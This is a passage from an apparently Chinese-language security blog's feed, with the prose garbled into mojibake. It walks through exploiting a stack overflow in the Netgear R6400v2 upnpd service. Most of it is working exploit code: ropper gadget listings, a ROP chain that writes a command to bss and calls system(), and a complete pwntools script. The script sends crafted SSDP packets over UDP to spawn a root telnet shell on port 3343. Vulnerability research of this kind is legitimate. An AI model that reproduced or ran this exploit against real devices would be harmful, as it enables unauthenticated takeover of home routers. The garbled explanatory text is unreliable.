class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">set_value_to_org_xml:1136()</span><br><span class="line">[0x0000e5e8] fopen(<span class="string">&#x27;/www/Public_UPNP_gatedesc.xml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) = 0x000db150</span><br><span class="line">[0x0000e620] fopen(<span class="string">&#x27;/tmp/upnp_xml&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) = 0x000db150</span><br><span class="line">data2XML()</span><br><span class="line">[0x0000f7d0] acosNvramConfig_get(<span class="string">&#x27;lan_ipaddr&#x27;</span>) = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><p>PS: æ“ä½œçš„è¿‡ç¨‹æ²¡æœ‰çœ‹åˆ° qemuï¼Œ é‚£æ˜¯å› ä¸ºæˆ‘ç³»ç»Ÿæœ‰ qemu binfmt çš„æ”¯æŒã€‚</p><h2 id="åˆ©ç”¨ç¼–å†™"><a href="#åˆ©ç”¨ç¼–å†™" class="headerlink" title="åˆ©ç”¨ç¼–å†™"></a>åˆ©ç”¨ç¼–å†™</h2><p>ç”±äºæ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ <code>strncpy</code> çš„ç¼“å†²åŒºæº¢å‡ºï¼Œ æˆ‘ä»¬çŸ¥é“ <code>strncpy</code> å‡½æ•°åœ¨æº¢å‡ºçš„æ—¶å€™ä¼šå­˜åœ¨ <code>\x00</code> æˆªæ–­ã€‚ç„¶è€Œç¨‹åºæ¯æ¬¡ä¸åŒé“¾æ¥ä½¿ç”¨çš„æ˜¯åŒä¸€å—å†…å­˜ï¼Œ æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡ <code>recvfrom</code> çš„æ—¶å€™åœ¨æ ˆä¸Šå¸ƒå±€å¥½ rop, ç„¶åé€šè¿‡æ ˆè¿ç§»è·³è½¬åˆ°å¸ƒå±€å¥½çš„ rop ä¸Šã€‚</p><ol><li>ç¬¬ä¸€æ¬¡è¿æ¥å¸ƒå±€å¥½ rop</li><li>ç¬¬äºŒæ¬¡è¿æ¥, æ„é€ ç¼“å†²åŒºæº¢å‡ºï¼Œæ ˆè¿ç§»åˆ° rop ä¸Šï¼Œç„¶åæ‰§è¡Œä»»æ„å‘½ä»¤</li></ol><p>æ•´ä½“æ€è·¯å¯ä»¥å‚è€ƒ ã€4ã€‘<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD Secure Disclosure (ssd-disclosure.com)</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png"></a></p><p>æ˜ç¡®äº†æ€è·¯æˆ‘ä»¬å°±éœ€è¦å¼€å§‹æ„é€  ropï¼Œ æ‰¾é½æ‰€éœ€çš„ gadget ã€‚</p><p>é€šè¿‡æŸ¥çœ‹ <code>sub_22D20</code> å‡½æ•°è¿”å›çš„åœ°æ–¹æ±‡ç¼–å¯çŸ¥ï¼Œ æ ˆæº¢å‡ºåï¼Œæˆ‘ä»¬å¯æ§çš„å¯„å­˜å™¨ä¸º <code>R4ã€R5ã€R6ã€PC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_22DB8</span><br><span class="line">MOV             R0, R4</span><br><span class="line">ADD             SP, SP, #0x80</span><br><span class="line">POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>PC</code> å¯„å­˜å™¨ä¸ºéœ€è¦çš„æ ˆè¿ç§» gadget </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f usr/sbin/upnpd --search <span class="string">&quot;add sp, sp&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘é€‰æ‹©äº†è¿™æ¡ gadget, å°†æ ˆè¿ç§»åˆ° <code>SP+0x800</code> çš„ä½ç½®ï¼Œ å¦å¤–é€šè¿‡è¿™æ¡ gadget æˆ‘å¯ä»¥æ¥ç€æ§åˆ¶ <code>R4ã€R5ã€R6ã€PC</code>  å››ä¸ªå¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00011B90                 ADD             SP, SP, #0x800</span><br><span class="line">.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–æœ€ç»ˆæˆ‘æœŸæœ›é€šè¿‡è°ƒç”¨ <code>system</code> å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œ å› æ­¤æˆ‘éœ€è¦åœ¨ bss è¿™æ ·å…¨å±€çš„åœ°å€ä¸Šå†™å…¥å‘½ä»¤ï¼Œ å› æ­¤æˆ‘éœ€è¦æ‰¾å¯¹åº”å¯ä»¥å¾€ä»»æ„åœ°å€å†™å…¥å€¼çš„ gadget ã€‚ åœ¨ arm çš„æ±‡ç¼–ä¸­ï¼Œå†™å…¥å€¼çš„æ±‡ç¼–æŒ‡ä»¤ä¸º <code>str</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ropper -f usr/sbin/upnpd --search <span class="string">&quot;str r?&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: str r?</span><br><span class="line"></span><br><span class="line">[INFO] File: usr/sbin/upnpd</span><br><span class="line">0x000299e8: str r0, [r3, <span class="comment">#0x214]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000167e0: str r0, [r4, <span class="comment">#0x40]; ldr r3, [pc, #0x54]; mvn r2, #0; mov r0, #0; str r2, [r3, #4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0000ba2c: str r0, [r5]; mov r0, r4; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0002d448: str r2, [r3, <span class="comment">#-0x974]; bl #0x3bf4; movw r0, #0x1f5; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002d468: str r2, [r3, <span class="comment">#-0x974]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002b360: str r2, [r3, <span class="comment">#0x248]; pop &#123;r3, pc&#125;;</span></span><br><span class="line">0x000182ec: str r2, [r3, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x000167f0: str r2, [r3, <span class="comment">#4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002b458: str r2, [r3]; add sp, sp, <span class="comment">#0x10; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0002af38: str r2, [r3]; bl <span class="comment">#0x326c; mov r0, r5; add sp, sp, #0x50; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0000ba6c: str r2, [r3]; bx lr;</span><br><span class="line">0x0000ba60: str r2, [r3]; mov r2, <span class="comment">#7; ldr r3, [sp, #4]; str r2, [r3]; bx lr;</span></span><br><span class="line">0x00017da0: str r2, [r3]; pop &#123;r3, pc&#125;;</span><br><span class="line">0x0002b524: str r2, [r3]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0000f120: str r3, [ip]; bl <span class="comment">#0x2e94; mov r0, #0; add sp, sp, #0xc; pop &#123;r4, r5, pc&#125;;</span></span><br><span class="line">0x00029950: str r3, [r2, <span class="comment">#0x200]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000182fc: str r3, [r2, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x00013d80: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x2c; add sp, sp, #0x800; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00013900: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x800; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x00013af4: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #4; add sp, sp, #0x1000; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017d64: str r3, [r4, <span class="comment">#0x140]; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x0000bac8: str r3, [r4]; add r0, r0, <span class="comment">#0x18400; add r0, r0, #0x2a0; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x000272ec: str r3, [r4]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0002dd64: str r3, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0000bc1c: str r3, [sp, <span class="comment">#4]; bl #0x3278; add sp, sp, #8; pop &#123;lr&#125;; add sp, sp, #0xc; bx lr;</span></span><br><span class="line">0x00014188: str r4, [sp, <span class="comment">#0xfc]; str ip, [sp, #0xf8]; bl #0x33b0; mov r0, r4; add sp, sp, #0x104; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017e98: str r5, [sp, <span class="comment">#4]; bl #0x308c; mov r0, r4; bl #0x2e64; add sp, sp, #0xd4; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™æ ·çš„éœ€æ±‚ï¼Œæˆ‘ä»è¿™äº› gadget ä¸­é€‰å–äº† <code>0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</code> è¿™æ¡æŒ‡ä»¤ï¼Œ é€šè¿‡æ§åˆ¶ r5ã€ r6 å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»»æ„å€¼ä»r6 å†™åˆ° r5 æ‰€æŒ‡å‘åˆ°åœ°å€ä¸­ã€‚ç„¶åæˆ‘é€šè¿‡ for å¾ªç¯å°±å¯ä»¥æ„é€ å‡ºå°†ä»»æ„å­—ç¬¦ä¸²ï¼Œå†™åˆ°ä»»æ„åœ°å€ä¸­çš„ rop é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br></pre></td></tr></table></figure><p>æœ€åå‘¢ï¼Œåœ¨æ‰¾ä¸€æ¡ <code>mov r0, r?, bl system </code>  è¿™æ ·çš„gadgetï¼Œ å°†ä¸ºå¯æ§çš„ <code>R3</code> åˆ° <code>R7</code> å¯„å­˜å™¨ä¸­çš„ä¸€ä¸ªè¦†å†™æˆåˆšåˆšå†™å…¥äº†å‘½ä»¤çš„åœ°å€ï¼Œç„¶åå°†å€¼ mov åˆ° <code>r0</code> å¯„å­˜å™¨ä¸Šã€‚ å› ä¸º arm åˆ°å‚æ•°ä¼ é€’æ˜¯ç”±å¯„å­˜å™¨ä¼ é€’çš„ï¼Œé€šè¿‡æ§åˆ¶ <code>r0</code> å¯„å­˜å™¨ï¼Œ æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ <code>system</code> æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>è¿™é‡Œäº†ä½¿ç”¨çš„æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0002704C                 MOV             R0, R4  ; command</span><br><span class="line">.text:00027050                 BL              system</span><br></pre></td></tr></table></figure><p>æ‰¾é½æ‰€æœ‰çš„gadget ï¼Œå¹¶ä¸”å°† rop é“¾å¸ƒç½®åˆ° <code>SP+0x800</code>çš„ä½ç½®ï¼Œ å› æ­¤ç¬¬ä¸€æ¬¡é“¾æ¥åˆ°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"> </span><br><span class="line">s = remote(<span class="string">&#x27;10.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>ç„¶åç¬¬äºŒæ¬¡é“¾æ¥ï¼Œä¸ºåªéœ€åŠ«æŒè¿”å›åœ°å€åˆ° stack pivot  çš„åœ°å€ä¸Šå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.text:00011B90                 ADD             SP, SP, #0x800</span></span><br><span class="line"><span class="comment">#.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>]) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„ exploitä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>).decode(<span class="string">&#x27;latin&#x27;</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>].decode(<span class="string">&#x27;latin&#x27;</span>)) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x8F874</span></span><br><span class="line">str_r6_r5 = <span class="number">0x0002dd4c</span></span><br><span class="line"><span class="comment"># 0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/usr/sbin/telnetd -p 3343 -b 0.0.0.0 -l /bin/sh \x00&quot;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;exploit .....&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><h2 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h2><p>ã€1ã€‘ <a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 å®˜æ–¹å…¬å‘Š</a><br>ã€2ã€‘ <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 å›ºä»¶</a><br>ã€3ã€‘ <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a><br>ã€4ã€‘ <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-45527" scheme="https://bestwing.me/tags/CVE-2021-45527/"/>
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>Capture The Ether Writeup</title>
    <link href="https://bestwing.me/Capture-The-Ether-writeup.html"/>
    <id>https://bestwing.me/Capture-The-Ether-writeup.html</id>
    <published>2022-05-06T16:00:00.000Z</published>
    <updated>2022-05-07T11:18:45.000Z</updated>
    
